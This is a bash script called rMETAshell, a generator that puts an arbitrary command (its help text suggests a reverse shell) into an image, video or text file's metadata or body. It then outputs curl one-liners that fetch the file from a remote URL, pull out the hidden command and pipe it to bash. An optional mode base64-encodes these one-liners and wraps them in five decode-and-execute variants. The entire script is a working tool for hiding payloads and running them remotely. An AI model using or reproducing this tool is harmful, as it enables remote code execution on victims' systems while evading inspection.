#!/bin/bash
#
# Ver. Sun/Jan/28/2024
# New update! - Added base64 encoding option
# plus 5 decoding methods for your one-liner!
#-------------------------------------------------
#
# From: git5 with ❤️
#
# rMETAshell - A metadata command injection
# one-liner generator and more!
#
# ------------------------------------------------
# Github
# https://github.com/git5loxosec
# ------------------------------------------------
# Website
# http://www.LoxoSec.rf.gd
# ------------------------------------------------
# X
# https://x.com/git5loxosec
# ------------------------------------------------
# Facebook
# https://www.facebook.com/profile.php?id=61551530174528
# ------------------------------------------------
# YouTube
# https://youtube.com/git5loxosec
# ------------------------------------------------
    echo ""
    echo -e "\e[36m          ##   ##  #######  ######     ##  \e[0m   \e[0;31m         ###                ###      ###\e[0m"    
    echo -e "\e[36m          ### ###   ##   #  # ## #    #### \e[0m   \e[0;31m          ##                 ##       ##\e[0m"    
    echo -e "\e[1;30m # #### \e[0m  \e[36m#######   ##        ##     ##  ##\e[0m   \e[0;31m #####    ##       ####      ##       ##\e[0m"    
    echo -e "\e[1;30m  ##  ##\e[0m  \e[36m#######   ####      ##     ##  ##\e[0m   \e[0;31m##        #####   ##  ##     ##       ##\e[0m"    
    echo -e "\e[1;30m  ##    \e[0m  \e[36m## # ##   ##        ##     ######\e[0m   \e[0;31m #####    ##  ##  ######     ##       ##\e[0m"    
    echo -e "\e[1;30m  ##    \e[0m  \e[36m##   ##   ##   #    ##     ##  ##\e[0m   \e[0;31m     ##   ##  ##  ##         ##       ##\e[0m"    
    echo -e "\e[1;30m ####   \e[0m  \e[36m##   ##  #######   ####    ##  ##\e[0m   \e[0;31m######   ###  ##   #####    ####     ####\e[0m"   
    echo ""                                                                                      


show_help() {
    echo -e "\e[36mUsage: $0 [OPTIONS] <COMMAND_TO_INJECT> <filename> <URL>\e[0m"
    echo -e "\e[36mInject a command into a media file, generate a one-liner execution method and more!.\e[0m"
    echo ""
    echo -e "\e[36mOptions:\e[0m"
    echo "  -h, --help           	   Display this help message."
    echo "  -e, --encode         	   Encode the one-liner with base64."
    echo ""
    echo -e "\e[36mArguments:\e[0m"
    echo -e "\e[36m  <COMMAND_TO_INJECT>   The command to inject into the file (e.g. reverse shell or custom script.\e[0m"
    echo -e "\e[36m  <filename>            The name of the file (e.g., example.png OR example.mp4.\e[0m"
    echo -e "\e[36m  <URL>                 The URL path to upload the file (e.g., http://www.example.com).\e[0m"
    echo ""
}

contains_element() {
    local element="$1"
    local list=($2) 
    for item in "${list[@]}"; do
        if [ "$element" == "$item" ]; then
            return 0  
        fi
    done
    return 1  
}

# Variables for file compatibility
media_compat_file="db/media_compatibility.txt"
text_compat_file="db/text_compatibility.txt"

if [ -f "$media_compat_file" ]; then
    media_compatibility=$(<"$media_compat_file")
else
    echo -e "\e[91mError: Media compatibility file '$media_compat_file' not found.\e[0m"
    exit 1
fi

if [ -f "$text_compat_file" ]; then
    text_compatibility=$(<"$text_compat_file")
else
    echo -e "\e[91mError: Text compatibility file '$text_compat_file' not found.\e[0m"
    exit 1
fi

# Flag for base64
encode_base64=false

# Parse command line
while [[ $# -gt 0 ]]; do
    case "$1" in
        -h|--help)
            show_help
            exit 0
            ;;
        -e|--encode)
            encode_base64=true
            shift
            ;;
        *)
            break
            ;;
    esac
done

# Check for the correct number of arguments
if [ $# -ne 3 ]; then
    echo -e "\e[91mError: Invalid number of arguments.\e[0m"
    show_help
    exit 1
fi

# Assign arguments
command="$1"
filename="$2"
url="$3"

# Extract file extension
file_extension="${filename##*.}"

# Inject the reverse shell command into the file
if contains_element "$file_extension" "$media_compatibility"; then
    echo -e "\e[95mInjecting reverse shell into media file...\e[0m"
    exiftool -Comment="$command" "$filename"
    echo -e "\e[95mMedia file command injection method completed.\e[0m"
elif contains_element "$file_extension" "$text_compatibility"; then
    echo -e "\e[95mInjecting reverse shell into text file...\e[0m"
    echo "<rs>$command</rs>" >> "$filename"
    echo -e "\e[95mText-based file command injection method completed.\e[0m"
else
    allowed_extensions=("zip" "rar")  

    if contains_element "$file_extension" "${allowed_extensions[*]}"; then
        echo -e "\e[36mWarning: The file extension '$file_extension' is not in the compatibility lists but is allowed.\e[0m"
    else
        echo -e "\e[91mError: File extension not supported.\e[0m"
        show_help
        exit 1
    fi
fi

# Generate one-liner method
echo -e "\e[36mSelect a one-liner method:\e[0m"
echo -e "\e[36mExecution methods compatible with image file format:\e[0m"
echo "1. image-exiftool-one-liner"
echo "2. image-exiv2-one-liner"
echo "3. image-identify-one-liner"
echo "4. image-file-grep-one-liner"

echo -e "\e[36mExecution methods compatible with video file format:\e[0m"
echo "5. video-exiftool-one-liner"
echo "6. video-ffprobe-one-liner"

echo -e "\e[36mExecution methods compatible with text file format:\e[0m"
echo "7. text-sed-one-liner"
echo -e "\e[36mExecution method for an infected image/video saved in a zip:\e[0m"
echo "8. image/video-exiftool-zip-one-liner"
read -p "Enter the method number (1-8): " method_choice

# Generare the one-liner based on the method chosen
case "$method_choice" in
    1)
        cmd="curl -s '$url/$filename' | exiftool -Comment -b - | bash"
        ;;
    2)
        cmd="curl -s '$url/$filename' -o $filename | exiv2 -p c $filename | bash"
        ;;
    3)
        cmd="curl -s '$url/$filename' | identify -format '%c' - | bash"
        ;;
    4)
        cmd="curl -s '$url/$filename' | file - | grep -oP 'comment: \"\K[^\"]*' | bash"
        ;;
    5)
        cmd="curl -s '$url/$filename' | exiftool -Comment -b - | bash"
        ;;
    6)
        cmd="curl -s '$url/$filename' -o $filename | ffprobe $filename -v error -show_entries format_tags=comment -of default=nw=1:nk=1 | bash"
        ;;
    7)
        cmd="curl -s '$url/$filename' | sed 's#<rs>##g' | sed 's#</rs>##' | bash"
        ;;
    8)
        read -p "Enter the name of the file inside the ZIP archive: " filename2
        cmd="curl -s '$url/$filename' -o $filename && unzip -p $filename $filename2 > $filename2 && exiftool -Comment -b $filename2 | bash && rm $filename2"
        ;;
    *)
        echo -e "\e[91mError: Invalid method number.\e[0m"
        exit 1
        ;;
esac

# Output the final one-liner with or without encoding and decoding method
if [ "$encode_base64" = true ]; then
    encoded_cmd=$(echo -n "$cmd" | base64)
    encoded_cmd="${encoded_cmd//[$'\t\r\n ']/}"
    echo -e "\e[0;36mSelect a decoding method:\e[0m"
    echo "1. Using awk"
    echo "2. Using xargs"
    echo "3. Direct execution in a subshell"
    echo "4. Using sed"
    echo "5. Using a here document"
    read -p "Enter the decoding method number (1-5): " decode_method

    case "$decode_method" in
        1)
            echo "echo '$encoded_cmd' | awk '{ print \$0}' | base64 -d | sh"
            ;;
        2)
            echo "echo '$encoded_cmd' | base64 -d | xargs -I {} sh -c \"{}\""
            ;;
        3)
            echo "sh -c \"\$(echo '$encoded_cmd' | base64 -d)\""
            ;;
        4)
            echo "echo '$encoded_cmd' | base64 -d | sed 's/\$/\n/' | sh"
            ;;
        5)
            echo "base64 -d <<< '$encoded_cmd' | sh"
            ;;
        *)
            echo "Invalid decoding method number."
            exit 1
            ;;
    esac
else
    one_liner="$cmd"
    echo -e "Generated one-liner:\n\e[0;31m$one_liner\e[0m"
fi

echo -e "\e[0;36mOne-liner method execution completed.\e[0m"
